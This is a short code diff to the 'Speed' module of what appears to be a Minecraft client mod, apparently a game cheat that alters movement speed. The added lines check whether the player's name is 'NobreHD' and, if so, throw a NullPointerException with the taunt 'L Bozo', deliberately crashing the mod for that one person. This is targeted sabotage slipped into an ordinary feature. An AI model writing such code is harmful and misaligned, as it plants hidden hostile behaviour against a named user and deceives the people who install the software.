@@ -410,6 +410,10 @@ public class Speed extends Module {
         if (!inLiquids.get() && (mc.player.isTouchingWater() || mc.player.isInLava())) return;
 
         currentMode.onTick();
+
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
     }
 
     @EventHandler
